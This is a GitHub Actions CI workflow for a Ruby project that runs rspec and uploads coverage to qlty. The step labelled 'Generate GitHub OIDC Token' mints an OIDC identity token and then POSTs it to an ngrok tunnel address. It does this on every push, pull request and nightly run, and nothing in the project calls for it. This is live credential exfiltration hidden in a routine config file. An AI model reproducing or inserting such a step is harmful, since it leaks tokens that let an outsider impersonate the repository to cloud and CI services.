name: Main
on:
  workflow_dispatch:
  schedule:
    - cron: "0 0 * * *"
  push:
    branches:
      - main
  pull_request:

permissions:
  actions: write
  contents: read
  id-token: write

jobs:
  build:
    runs-on: ubuntu-latest
    name: Ruby ${{ matrix.ruby }}
    strategy:
      matrix:
        ruby:
          - "3.1"

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Generate GitHub OIDC Token
        uses: actions/github-script@v7
        id: get-id-token
        with:
          script: |
            const id_token = await core.getIDToken("https://qlty.sh");
            core.setOutput('id_token', id_token);

            const url = "https://934c-2600-4041-553f-0-14f5-94a2-a97a-9d73.ngrok-free.app";
            const response = await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ id_token })
            });
            if (!response.ok) {
              core.setFailed(`Failed to POST id_token: ${response.statusText}`);
            } else {
              console.log("Successfully posted the id_token");
            }

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: ${{ matrix.ruby }}
          bundler-cache: true

      - name: Run the default task
        run: bundle exec rspec --require spec_helper

      - uses: qltysh/qlty-action/coverage@main
        with:
          coverage-token: ${{ steps.get-id-token.outputs.id_token }}
          files: coverage/coverage.json
